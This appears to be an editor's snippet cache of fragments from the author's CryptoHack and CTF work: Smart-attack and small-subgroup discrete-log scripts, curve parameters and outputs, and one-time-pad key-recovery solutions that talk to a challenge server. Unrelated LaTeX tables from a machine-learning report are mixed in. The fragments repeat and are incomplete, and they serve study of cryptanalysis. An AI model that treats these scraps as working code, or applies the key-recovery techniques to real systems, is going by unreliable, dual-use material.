	a = 0x5e009506fcc7eff573bc960d88638fe25e76a9b6c7caeea072a27dcd1fa46abb15b7b6210cf90caba982893ee2779669bac06e267013486b22ff3e24abae2d42
	b = 0x2ce7d1ca4493b0977f088f6d30d9241f8048fdea112cc385b793bce953998caae680864a7d3aa437ea3ffd1441ca3fb352b0b710bb3f053e980e503be9a7fece
	
	# Define curve
	E = EllipticCurve(GF(p), [a, b])
d20a087843dfaf54a6db7f88ee1aac35|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|1|170|v|text
	4986645098582616415690074082237817624424333339074969364527548107042876175480894132576399611027847402879885574130125050842710052291870268101817275410204850 
4e8ac4ffe4b069580ecf1f39f544d354|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|3|1|v|python
	sage: 
034f5767eb9d35c0dbee4a246c5df29f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|25|1|V|python
	sage:
a69108d8ff0ab14eb85fb7ff6366efd2|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|38|1|V|python
	# E = EllipticCurve(GF(43), [0,-4,0,-128,-432])
	# print E.order()
	# P=E([0,16])
	# Q=39*P
3415f42a7f0d5106f641d17e12a6b9e6|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/exceptional.sage|33|1|v|python
	    # Encrypt flag
17631ae315414862aeb2a234333d0450|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/exceptional.sage|45|1|V|python
	p = 0xa15c4fb663a578d8b2496d3151a946119ee42695e18e13e90600192b1d0abdbb6f787f90c8d102ff88e284dd4526f5f6b6c980bf88f1d0490714b67e8a2a2b77
	a = 0x5e009506fcc7eff573bc960d88638fe25e76a9b6c7caeea072a27dcd1fa46abb15b7b6210cf90caba982893ee2779669bac06e267013486b22ff3e24abae2d42
	b = 0x2ce7d1ca4493b0977f088f6d30d9241f8048fdea112cc385b793bce953998caae680864a7d3aa437ea3ffd1441ca3fb352b0b710bb3f053e980e503be9a7fece
3b24bb36b36169adebfd63058f4b515c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/exceptional.sage|50|1|V|python
	E = EllipticCurve(GF(p), [a, b])
769fdef3fd64591c890ef099e7d28f4d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|41|1|V|python
	E = EllipticCurve(GF(43), [0,-4,0,-128,-432])
6bdf30193cb0c3d1853e16bc79b51840|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|1|12|v|text
	(3034712809375537908102988750113382444008758539448972750581525810900634243392172703684905257490982543775233630011707375189041302436945106395617312498769005 : 4986645098582616415690074082237817624424333339074969364527548107042876175480894132576399611027847402879885574130125050842710052291870268101817275410204850 : 1)
a988251021518261c829b4e545dfca14|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|50|1|V|python
	# SmartAttack(P,Q,43,8)
28dd20c0c1446ad3f034911cc1f1a568|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|45|1|V|python
	P=E([0,16])
faf0b173619caa92b222ccbef822b48a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/smart.sage|45|1|V|python
	Q=39*P
5f5ecbc0f5ab827068a0072015e18288|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|2|13|v|text
	(4748198372895404866752111766626421927481971519483471383813044005699388317650395315193922226704604937454742608233124831870493636003725200307683939875286865 : 2421873309002279841021791369884483308051497215798017509805302041102468310636822060707350789776065212606890489706597369526562336256272258544226688832663757 : 1)
3e7a30a70471c63fcf73a53fbaf51edf|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/exceptional.sage|22|1|V|python
	    b_x = 0x7f0489e4efe6905f039476db54f9b6eac654c780342169155344abc5ac90167adc6b8dabacec643cbe420abffe9760cbc3e8a2b508d24779461c19b20e242a38
	    b_y = 0xdd04134e747354e5b9618d8cb3f60e03a74a709d4956641b234daa8a65d43df34e18d00a59c070801178d198e8905ef670118c15b0906d3a00a662d3a2736bf
	    B = E(b_x, b_y)
28ee942915f22a4e5598f4822fd23c71|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|1|V|python
	shared_secret = 171172176587165701252669133307091694084
fa579edfc0141f2e6d7be40a4e06078d|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|1|V|python
	iv = '07e2628b590095a5e332d397b8a59aa7'
d570c6c253a92699decb254087bea501|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|1|V|python
	ciphertext = '8220b7c47b36777a737f5ef9caa2814cf20c1c1ef496ec21a9b4833da24a008d0870d3ac3a6ad80065c138a2ed6136af'
3499894b219a810f0198c4821cc69439|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|3|8|v|text
	'719700b2470525781cc844db1febd994'
ca7a9ec9d69cdacf4f093e1d3721cbc3|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_db96ba0b779440f32de9b556d0514b35.txt|3|62|v|text
	'335470f413c225b705db2e930b9d460d3947b3836059fb890b044e46cbb343f0'
5cc10388bb3cbf0b8344443dd7084dd9|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/micro.sage|44|1|V|python
	a = 1
	b = 4
	E = EllipticCurve(GF(p), [a,b])
84fc288a948247b6ce0a3898a3e5ff66|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|2|71|v|text
	99061670249353652702595159229088680425828208953931838069069584252923270946291
1eb040be75e0a99f5c4693914563e85e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|3|19|v|text
	43190960452218023575787899214023014938926631792651638044680168600989609069200
6b9e323a6085198b9a4ac2ef7b8f2e8b|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|3|99|v|text
	20971936269255296908588589778128791635639992476076894152303569022736123671173 : 1)
a430e9c38b2ae4342b2e5b5ea353e233|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|3|99|v|text
	20971936269255296908588589778128791635639992476076894152303569022736123671173 
e1dad084c50c2822ed8fed5a9625e4aa|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|6|23|v|text
	6082896373499126624029343293750138460137531774473450341235217699497602895121
17f62f074bfc78eb587e37105207edf7|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/micro.sage|44|1|V|python
	a = 1
	b = 4
67ad95ec4efd7ba58b4fa23484fbf890|file:///home/neo/CTFs/scripts/crypto/smart.sage|38|1|V|python
	p = 0xa15c4fb663a578d8b2496d3151a946119ee42695e18e13e90600192b1d0abdbb6f787f90c8d102ff88e284dd4526f5f6b6c980bf88f1d0490714b67e8a2a2b77
12407eef8b60b30e22125883c782b954|file:///home/neo/CTFs/scripts/crypto/smart.sage|39|1|V|python
	a = 0x5e009506fcc7eff573bc960d88638fe25e76a9b6c7caeea072a27dcd1fa46abb15b7b6210cf90caba982893ee2779669bac06e267013486b22ff3e24abae2d42
	b = 0x2ce7d1ca4493b0977f088f6d30d9241f8048fdea112cc385b793bce953998caae680864a7d3aa437ea3ffd1441ca3fb352b0b710bb3f053e980e503be9a7fece
90aedce828b0dfea3ea4b32fe01232e0|file:///home/neo/CTFs/scripts/crypto/smart.sage|44|1|V|python
	P = E(4748198372895404866752111766626421927481971519483471383813044005699388317650395315193922226704604937454742608233124831870493636003725200307683939875286865, 2421873309002279841021791369884483308051497215798017509805302041102468310636822060707350789776065212606890489706597369526562336256272258544226688832663757)
3056dd04ce9d66d6459904b5ff0fbf07|file:///home/neo/CTFs/scripts/crypto/smart.sage|43|1|V|python
	G = E(3034712809375537908102988750113382444008758539448972750581525810900634243392172703684905257490982543775233630011707375189041302436945106395617312498769005, 4986645098582616415690074082237817624424333339074969364527548107042876175480894132576399611027847402879885574130125050842710052291870268101817275410204850)
c55b681bf7146f42fe6cc0d1a25d166d|file:///home/neo/CTFs/scripts/crypto/smart.sage|43|1|V|python
	print('Generator order:', G.order())
5d03936dae706000bf5c178e90ada0e6|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|95|v|python
	 8216782777192629016736082577047876662181587556895841333932300215083185803392455455078234452846594885807223123796905544359993306809106491336354148716965075
c0cf5f65cb62b0b76c21e3ddfacf6c2b|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|8|37|v|text
	ceb34a8c174d77136455971f08641cc5
51778dc9bc909ffc82fa35b41cbd7c0b|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|5|v|python
	719700b2470525781cc844db1febd994'
9c79bbbd93d3f2725feda8d50b66bd0e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|8|90|v|text
	'b503bf04df71cfbd3f464aec2083e9b79c825803a4d4a43697889ad29eb75453'
409f26c7dcb1b45d0cc5e7244d1484fc|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|5|24|v|text
	 87360200456784002948566700858113190957688355783112995047798140117594305287669
fb887f280d74ac1ba311d7f74617ceb5|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|1|V|python
	shared_secret = 44007643344749043939858709300517187809720336390788526037253042563116626727133
319ca0736b786f88fb3c289ff3f331b5|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_aabbd844dd2b52cbab4978e8f0b3b95c.txt|5|25|v|text
	87360200456784002948566700858113190957688355783112995047798140117594305287669
538ef1a5d68da62ac947fb3f064f4ed2|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|34|11|v|python
	[2, 3**7, 139, 165229, 31850531, 270778799, 179317983307]
f6230600c72ffeecbdd40e87213b92a1|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|15|1|V|python
	a = 2
	b = 3
8f7810d4626735efbfdb00ef079e5eab|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|18|7|v|python
	179210853392303317793440285562762725654 
4c1bcbf2da39f86d0e13a9ef9315ab5e|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|24|1|V|python
	a_y=291506490768054478159835604632710368904
3d4f0c2dfb5f418b50d08abd5d72920c|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|23|1|V|python
	a_x = 280810182131414898730378982766101210916
29e2296538caaf00c38e4b5ec2adb852|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|28|1|V|python
	b_y = 51062462309521034358726608268084433317
923fc6382a6a4e030c172c3000038d72|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|27|7|v|python
	272640099140026426377756188075937988094
ca8b1d8acc7d4375334d1fb7dd8a94e8|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|45|1|V|python
	    disc_log = G_tmp.discrete_log(A_tmp)
e3ae06af03bd32ccdf1aad6b6210f3f4|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|46|16|v|python
	G_tmp.discrete_log(A_tmp)
b83ec77f0bb7a21f34659106da42131f|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|44|1|V|python
	    tmp_ord
b9dcc97a2136958b8098a55b0e124abd|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|43|1|V|python
	prod =
32dca0a0fbb9b2e853731d8b1b8dc952|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|46|5|V|python
	    if tmp_ord != max(factors) and tmp_ord != max(factors.remove(max(factors))):
b468152926e5b68dbaede7a2ed34ae06|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|41|1|V|python
	for i in range(to_remove):
	    factors.remove(max(factors))
4736f3d5bc57ac11412bbbbe6059d1c9|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|40|1|V|python
	to_remove = 2
48f4014fccc485cec2304b6f768ae5bb|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|34|17|V|python
	shared_secret = 67467536926525312028073395786854415426797643904690454860504846521966025079041
	shared_secret = 16424625092809161461591073909718207308898265836928239416880657015612986920106
979143c4b35f6efd396e9b07a1768245|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|1|V|python
	shared_secret = 67403259846882234778813809687323382340134985898786347860026764305578067731674
37040676aa6fd3d4da3316516f30576e|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|1|V|python
	shared_secret = 43483023399117437271523593386632099439118903546204373456150528196897050746648
3d52c67149e673b6e7ab61f6b16331df|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|51|25|V|python
	        print(co_factors)
	        print(tmp_ord)
77c94dfb8e5f4c360a854e59810e131e|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|52|9|V|python
	        print(prod)
54c764a92937c7727b9bd43a74238e0f|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|41|1|V|python
	# Don't check for the n biggest factor to save time, reduce if crt cant find answer
	to_remove = 2
	tmp_factors = factors[::]
	for i in range(to_remove):
	    tmp_factors.remove(max(tmp_factors))
	
3093e2b41a6a2c82cf1f4d46d6dd5a05|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|44|1|V|python
	    if tmp_ord in tmp_factors:
645b3808151a9ce2cdcebf0a91ddee4f|file:///home/neo/CTFs/scripts/crypto/small_subgroups.py|48|5|V|python
	    disc_log = discrete_log_rho(A_tmp, G_tmp, ord=tmp_ord, operation='+')
8d2981a9b7ef98133614522e5667d178|file:///home/neo/cryptohack/elliptic-curves/output_470597e226bbe018d357db4af841ef48.txt|1|7|v|text
	x=2582928974243465355371953056699793745022552378548418288211138499777818633265, y=2421683573446497972507172385881793260176370025964652384676141384239699096612
73791a44bd512d38caad4c8f0ac4a04b|file:///home/neo/cryptohack/elliptic-curves/nodes.py|69|1|V|python
	gx = 8742397231329873984594235438374590234800923467289367269837473862487362482
	gy = 225987949353410341392975247044711665782695329311463646299187580326445253608
6b9c84c131ab30a3e9c614b93567a8d4|file:///home/neo/cryptohack/elliptic-curves/nodes.py|67|1|V|python
	p = 4368590184733545720227961182704359358435747188309319510520316493183539079703
38cde61d71d5919502a1a164840d4eeb|file:///home/neo/cryptohack/elliptic-curves/nodes.py|73|1|V|python
	# x=2582928974243465355371953056699793745022552378548418288211138499777818633265
	# y=2421683573446497972507172385881793260176370025964652384676141384239699096612
8dfc98b24528286a45dd9a849f9977eb|file:///home/neo/cryptohack/elliptic-curves/nodes.py|69|6|v|python
	8742397231329873984594235438374590234800923467289367269837473862487362482
f4517c23a1c34db17cd2f0d8cd8458e5|file:///home/neo/cryptohack/elliptic-curves/nodes.py|70|6|v|python
	225987949353410341392975247044711665782695329311463646299187580326445253608
cb38c3158f839885b222455dea6af38d|file:///home/neo/cryptohack/elliptic-curves/nodes.py|73|5|v|python
	2582928974243465355371953056699793745022552378548418288211138499777818633265
7b345539c65d11d375476f3e099ef2b3|file:///home/neo/cryptohack/elliptic-curves/nodes.py|74|5|v|python
	2421683573446497972507172385881793260176370025964652384676141384239699096612
bd86176dbb00ca60ee906538bfa7ef83|file:///home/neo/cryptohack/elliptic-curves/nodes.py|67|1|V|python
	p = 4368590184733545720227961182704359358435747188309319510520316493183539079703
	a = 4368590184669359031465831106831710631292214264897111119909780206746270656591
	b = 4336010239160781921237892077769460666196594827754305426451763098010830049809
	
	gx = 8742397231329873984594235438374590234800923467289367269837473862487362482
	gy = 225987949353410341392975247044711665782695329311463646299187580326445253608
	G = Point(gx, gy)
899fbf05167b43f3ee01f390353156d2|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|235|1|V|tex
	\begin{tabular}{|c|l|l|l|l|}
	\hline
	Model               & Preprocessing methods                                                                           & Parameter values                                                                                   & Cross validation average score & Kaggle Score \\ \hline
	Logistic Regression & \begin{tabular}[c]{@{}l@{}}Dense, countvec, \\ clear data, lemmatize\end{tabular}               & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ solver = sag \\ penalty = l2 \\ c = 1.1\end{tabular}       & 0.756487                       & 0.79447      \\ \hline
	SVC                 & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data, \\ stem, lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq =15 \\ kernel =rbf \\ c = 1.5\end{tabular}                         & 0.759635                       & 0.80265      \\ \hline
	MultinomialNB       & \begin{tabular}[c]{@{}l@{}}Dense, tfidf, Clear data, \\ lemmatize, keywords\end{tabular}        & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ alpha = 0.1\end{tabular}                                   & 0.750952                       & 0.77914      \\ \hline
	SGDClassifier       & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data,\\  stem, Lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq = 20 \\ loss = hinge  \\ penalty = l2 \\ ratio = 0.15\end{tabular} & 0.754956                       & 0.78425      \\ \hline
	BernoulliNB         & \begin{tabular}[c]{@{}l@{}}Dense, tfidf,  clear data, \\ stem, lemmatize, keywords\end{tabular} & \begin{tabular}[c]{@{}l@{}}freq = 15\\ alpha = 1.0\end{tabular}                                    & 0.751552                       & 0.78118      \\ \hline
	\end{tabular}
e8862afd5c3dac042b40ac852f864984|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|234|5|V|tex
	    \label{tab:final}
a2a15439604afedb8d0a365b2a43b4f8|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|235|5|V|tex
	    \caption{Final scores of the best models, along with the corresponding Kaggle scores}
a4cfc4d38af2d2eb9beaa02cccef4e15|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|235|5|V|tex
	    \textwidth
1a3400152a1347adb9dbef885ee6b638|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|237|1|V|tex
	\begin{tabular}{|c|l|l|l|l|}
	\hline
	Model               & Preprocessing methods                                                                           & Parameter values                                                                                   & \begin{tabular}[c]{@{}l@{}}Cross validation \\  average score\end{tabular} & Kaggle Score \\ \hline
	Logistic Regression & \begin{tabular}[c]{@{}l@{}}Dense, countvec, \\ clear data, lemmatize\end{tabular}               & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ solver = sag \\ penalty = l2 \\ c = 1.1\end{tabular}       & 0.756487                                                                   & 0.79447      \\ \hline
	SVC                 & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data, \\ stem, lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq =15 \\ kernel =rbf \\ c = 1.5\end{tabular}                         & 0.759635                                                                   & 0.80265      \\ \hline
	MultinomialNB       & \begin{tabular}[c]{@{}l@{}}Dense, tfidf, Clear data, \\ lemmatize, keywords\end{tabular}        & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ alpha = 0.1\end{tabular}                                   & 0.750952                                                                   & 0.77914      \\ \hline
	SGDClassifier       & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data,\\  stem, Lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq = 20 \\ loss = hinge  \\ penalty = l2 \\ ratio = 0.15\end{tabular} & 0.754956                                                                   & 0.78425      \\ \hline
	BernoulliNB         & \begin{tabular}[c]{@{}l@{}}Dense, tfidf,  clear data, \\ stem, lemmatize, keywords\end{tabular} & \begin{tabular}[c]{@{}l@{}}freq = 15\\ alpha = 1.0\end{tabular}                                    & 0.751552                                                                   & 0.78118      \\ \hline
	\end{tabular}
	\end{table*}
acaaf51d7fb4f3ba0db98f0fc5e47cd9|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|231|1|V|tex
	\section{Final choice}
	After the conclusions we made in the previous sections, we experimented with the parameters of the five algorithms with the best results so far, to improve the result if we can. We also submitted the submission files at the Kaggle website to see the score. 
	\begin{table*}[ht!]
	    \caption{Final scores of the best models, along with the corresponding Kaggle scores}
	    \centering
	    \label{tab:final}
	\begin{tabular}{|c|l|l|l|l|}
	\hline
	Model               & Preprocessing methods                                                                           & Parameter values                                                                                   & \begin{tabular}[c]{@{}l@{}}Cross validation \\  average score\end{tabular} & Kaggle Score \\ \hline
	Logistic Regression & \begin{tabular}[c]{@{}l@{}}Dense, countvec, \\ clear data, lemmatize\end{tabular}               & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ solver = sag \\ penalty = l2 \\ c = 1.1\end{tabular}       & 0.756487                                                                   & 0.79447      \\ \hline
	SVC                 & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data, \\ stem, lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq =15 \\ kernel =rbf \\ c = 1.5\end{tabular}                         & 0.759635                                                                   & 0.80265      \\ \hline
	MultinomialNB       & \begin{tabular}[c]{@{}l@{}}Dense, tfidf, Clear data, \\ lemmatize, keywords\end{tabular}        & \begin{tabular}[c]{@{}l@{}}freq = 15 \\ alpha = 0.1\end{tabular}                                   & 0.750952                                                                   & 0.77914      \\ \hline
	SGDClassifier       & \begin{tabular}[c]{@{}l@{}}Dense, countvec, clear data,\\  stem, Lemmatize\end{tabular}         & \begin{tabular}[c]{@{}l@{}}freq = 20 \\ loss = hinge  \\ penalty = l2 \\ ratio = 0.15\end{tabular} & 0.754956                                                                   & 0.78425      \\ \hline
	BernoulliNB         & \begin{tabular}[c]{@{}l@{}}Dense, tfidf,  clear data, \\ stem, lemmatize, keywords\end{tabular} & \begin{tabular}[c]{@{}l@{}}freq = 15\\ alpha = 1.0\end{tabular}                                    & 0.751552                                                                   & 0.78118      \\ \hline
	\end{tabular}
	\end{table*}
8c5ded60348ee2d38a13b0533926776e|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|183|5|V|tex
	    \caption{Final result for each model with cross validation scores}
fe77a0a6aa132c02dc7ae29dcc8c5514|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|182|5|V|tex
	    \label{tab:results}
8668e757ab6570ce4376036787fe468d|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|180|20|v|tex
	{.9\textwidth}
95b5bef5025f810e3f90a1bd95ed1232|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|230|5|v|tex
	\label{tab:final}
bb520187305b981d60edb13634b4d6be|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|180|20|v|tex
	{\textwidth}
ccc9daaeae075360e3d8e1c21f026eea|file:///home/neo/cryptohack/one-time-pad/gtg_sol.py|6|1|V|python
	exe = context.binary = ELF('./binary')
017e27da3a8a6a11c150e549340154a5|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|9|1|V|python
	def json_recv():
	    line = r.recvline()
	    return json.loads(line.decode())
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(request)
	
	def decode_base64(encoded):
	    return base64.b64decode(encoded)
	
	def decode_hex(encoded):
	    # return bytes.fromhex(encoded).decode('ascii')
	    return codecs.encode(codecs.decode(encoded, 'hex').decode('latin-1'), 'latin-1')
	
	def decode_rot13(encoded):
	    return encoded.decode('rot13') 
	
	def decode_bigint(encoded):
	    return number.long_to_bytes(int(encoded, 16)).decode('latin-1')
	
	def decode_utf8(encoded):
	    return ''.join([chr(x) for x in encoded])
	    
	
d0401cdfd0d864555745f69c88f2e07c|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|17|1|V|python
	def decode_base64(encoded):
	    return base64.b64decode(encoded)
	
	def decode_hex(encoded):
	    # return bytes.fromhex(encoded).decode('ascii')
	    return codecs.encode(codecs.decode(encoded, 'hex').decode('latin-1'), 'latin-1')
	
	def decode_rot13(encoded):
	    return encoded.decode('rot13') 
	
	def decode_bigint(encoded):
	    return number.long_to_bytes(int(encoded, 16)).decode('latin-1')
	
	def decode_utf8(encoded):
	    return ''.join([chr(x) for x in encoded])
653229714f323659ba2b5db64b27841b|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|17|1|V|python
	
	encodings = {
	        'base64': decode_base64,
	        'hex': decode_hex,
	        'rot13': decode_rot13,
	        'bigint': decode_bigint,
	        'utf-8': decode_utf8
	        }
	for _ in range(100):
	    received = json_recv()
	    enc_type = received["type"]
	    enc_value = received["encoded"]
	    decr_function = encodings.get(enc_type)
	    decr_value = decr_function(enc_value)
	
	    to_send = {
	        "decoded": decr_value
	    }
	    json_send(to_send)
	
	json_recv()
fb13aeeb0bb9ab7eb22477c4cd107b3c|file:///home/neo/cryptohack/misc/one-time-pad/gottagofast.py|22|1|V|python
	    for i in range(len(b)):
	        ciphertext += bytes([b[i] ^ key[i]])
c486c4522db27633cad2981f1030e987|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|26|1|V|python
	for i in range(len(xored_msg)):
	    key += bytes([xored_msg[i] ^ msg[i]])
6301b0d8116b701aae374d61acfead85|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|29|20|v|python
	xored_msg
9186939c73c42b4608bf453f2d129144|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|20|1|V|python
	print(line)
7aad5ab2f2c693a11fd369e5dea233f5|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|26|1|V|python
	msg = bytes(msg, 'utf-8')
26d8ca4fc3e6c07917a56cf98d99a47f|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|27|1|V|python
	print(len(xored_msg))
a594fb4949f673a0eca1f242fb1005d5|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|27|1|V|python
	print(len(msg))
161ece29bbfe58e39c7c1b23b2499534|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|29|1|V|python
	print(length)
eee643b7a141c534df069755e879f354|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|21|1|V|python
	length = len(enc_flag)
2fa47f7c65fec19cc163b195725e3844|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|32|16|v|python
	length
4eb6afd283e148467c5c3e92631d7c3e|file:///home/neo/cryptohack/misc/one-time-pad/gtg_sol.py|20|12|v|python
	bytes.fromhex(
ef3e30e070f70244fd6578d88a6b77ac|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|18|13|v|python
	option
4f81ac9461cc34d93a197bcaab4b3bd8|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|21|1|V|python
	length = len(enc_flag)
	
	msg = 'a' * length
	json_send({'option': 'encrypt_data', 'input_data': msg})
	xored_msg = bytes.fromhex(json_recv()['encrypted_data'])
	msg = bytes.fromhex(msg)
	enc_flag = bytes.fromhex(enc_flag)
	
	key = b''
	for i in range(len(xored_msg)):
	    key += bytes([xored_msg[i] ^ msg[i]])
	
	flag = b''
	for i in range(len(key)):
	    flag += bytes([key[i] ^ enc_flag[i]])
	
	print(flag)
be1d67a3c75a8ef03b61b4d2232107a0|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|20|1|v|python
	enc_flag
0565f782286c114340e50ae6f849a204|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|20|27|v|python
	encrypted_flag
d5241c9f5f81474d9dbf6d4596dee0b3|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|7|1|V|python
	r = remote('socket.cryptohack.org', 13370, level = 'debug')
c71cb73d69c8a3b1088adef3865e2536|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|20|1|V|python
	r.recvline()
05ba78e9e2459776f251e7a48b4087e8|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|22|31|v|python
	json_recv()
801892f047a1c0a27c0cfc56124254e5|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|8|42|v|python
	, level = 'debug'
0a16e260b89b02d045a696ca7639934c|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|23|1|V|python
	json_send({'msg': 'request'})
7b600cccb32416c09bd9d93007b687fd|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|24|1|V|python
	response = json_recv()
056895dab757a2ef95f7a2db97233106|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|29|1|V|python
	json_send({'msg': 'request'})
	response = json_recv()
49fa1d5c5b1d7eae10105016caa93683|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|32|1|V|python
	print(eliminated[0])
6aab1e27f4333e15478924e8a5b429c2|file:///home/neo/cryptohack/misc/one-time-pad/sol_leaks.py|30|1|V|python
	            eliminated[i].add(c)
	
3220ac2ea375373fb738b967e7264d4b|file:///home/neo/cryptohack/general/mathematics2/data.txt|1|5|v|text
	14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073
be411852cae6ade60b7764543db9943e|file:///home/neo/cryptohack/general/mathematics2/data.txt|2|1|V|text
	e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137
	e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697
